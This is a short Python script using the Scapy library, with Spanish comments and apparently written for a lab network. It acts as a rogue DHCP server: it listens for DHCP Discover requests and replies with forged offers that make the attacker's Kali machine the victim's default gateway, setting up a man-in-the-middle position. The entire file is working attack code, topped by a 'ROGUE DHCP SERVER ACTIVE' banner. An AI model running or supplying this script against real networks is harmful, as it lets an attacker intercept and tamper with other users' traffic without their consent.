from scapy.all import *
import os

# Configuración del Atacante
KALI_IP = "10.24.11.10"
VICTIM_IP = "10.24.11.55"
NETMASK = "255.255.255.0"

def show_rogue_banner():
    print("""
    ##########################################################
    #                                                        #
    #    ██████╗  ██████╗  ██████╗ ██╗   ██╗███████╗         #
    #    ██╔══██╗██╔═══██╗██╔════╝ ██║   ██║██╔════╝         #
    #    ██████╔╝██║   ██║██║  ███╗██║   ██║█████╗           #
    #    ██╔══██╗██║   ██║██║   ██║██║   ██║██╔══╝           #
    #    ██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗         #
    #    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝         #
    #                                                        #
    #           [!] ROGUE DHCP SERVER ACTIVE                 #
    #           [!] SPOOFING GATEWAY TO: 10.24.11.10         #
    ##########################################################
    """)

def handle_dhcp(pkt):
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1: # DHCP Discover
        print(f"\n[!] Detectada petición de: {pkt[Ether].src}")
        
        # Construcción de la oferta (DHCPOFFER)
        offer = Ether(src=get_if_hwaddr("eth0"), dst=pkt[Ether].src) / \
                IP(src=KALI_IP, dst="255.255.255.255") / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, yiaddr=VICTIM_IP, siaddr=KALI_IP, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
                DHCP(options=[("message-type", "offer"),
                              ("server_id", KALI_IP),
                              ("subnet_mask", NETMASK),
                              ("router", KALI_IP), # <--- AQUÍ ESTÁ EL TRUCO (Gateway = Kali)
                              ("lease_time", 3600),
                              "end"])
        
        sendp(offer, iface="eth0", verbose=0)
        print(f"[*] Enviado DHCPOFFER: {VICTIM_IP} a {pkt[Ether].src}")

show_rogue_banner()
print("[+] Escuchando peticiones DHCP en eth0...")
sniff(filter="udp and (port 67 or 68)", prn=handle_dhcp, iface="eth0")

